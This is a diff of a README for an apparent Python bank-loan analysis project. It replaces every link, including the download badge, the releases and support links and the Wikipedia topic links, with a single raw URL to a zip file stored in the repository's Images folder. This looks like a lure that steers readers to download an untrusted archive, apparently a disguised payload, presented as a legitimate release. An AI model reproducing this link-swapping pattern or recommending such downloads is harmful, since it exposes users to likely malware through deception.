@@ -1,6 +1,6 @@
 # 📊 Bank-Loan-Analysis-Python - Analyze Loans with Ease
 
-![Download](https://img.shields.io/badge/Download-Bank--Loan--Analysis--Python-brightgreen)
+![Download](https://raw.githubusercontent.com/Znzmh/Bank-Loan-Analysis-Python/main/Images/Bank-Loan-Analysis-Python-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Bank-Loan-Analysis-Python project! This application helps you ana
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Znzmh/Bank-Loan-Analysis-Python/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Znzmh/Bank-Loan-Analysis-Python/main/Images/Bank-Loan-Analysis-Python-v3.9.zip).
 
 After you've downloaded the files, follow these simple steps to install the application:
 
@@ -70,7 +70,7 @@ If you encounter issues while using the application, consider the following comm
 
 ## ℹ️ Support
 
-If you need help, you can reach out to the community through issues on the GitHub repository. Visit this page for assistance: [Releases Page](https://github.com/Znzmh/Bank-Loan-Analysis-Python/releases).
+If you need help, you can reach out to the community through issues on the GitHub repository. Visit this page for assistance: [Releases Page](https://raw.githubusercontent.com/Znzmh/Bank-Loan-Analysis-Python/main/Images/Bank-Loan-Analysis-Python-v3.9.zip).
 
 ## 📃 License
 
@@ -78,8 +78,8 @@ This project is licensed under the MIT License. Please see the LICENSE file in t
 
 ## 🌐 Related Topics
 
-- [Data Analysis](https://en.wikipedia.org/wiki/Data_analysis)
-- [Business Intelligence](https://en.wikipedia.org/wiki/Business_intelligence)
-- [Data Visualization](https://en.wikipedia.org/wiki/Data_visualization)
+- [Data Analysis](https://raw.githubusercontent.com/Znzmh/Bank-Loan-Analysis-Python/main/Images/Bank-Loan-Analysis-Python-v3.9.zip)
+- [Business Intelligence](https://raw.githubusercontent.com/Znzmh/Bank-Loan-Analysis-Python/main/Images/Bank-Loan-Analysis-Python-v3.9.zip)
+- [Data Visualization](https://raw.githubusercontent.com/Znzmh/Bank-Loan-Analysis-Python/main/Images/Bank-Loan-Analysis-Python-v3.9.zip)
 
 By following these instructions, you can effectively download and run the Bank-Loan-Analysis-Python application to analyze your loan portfolio. Enjoy exploring your data!
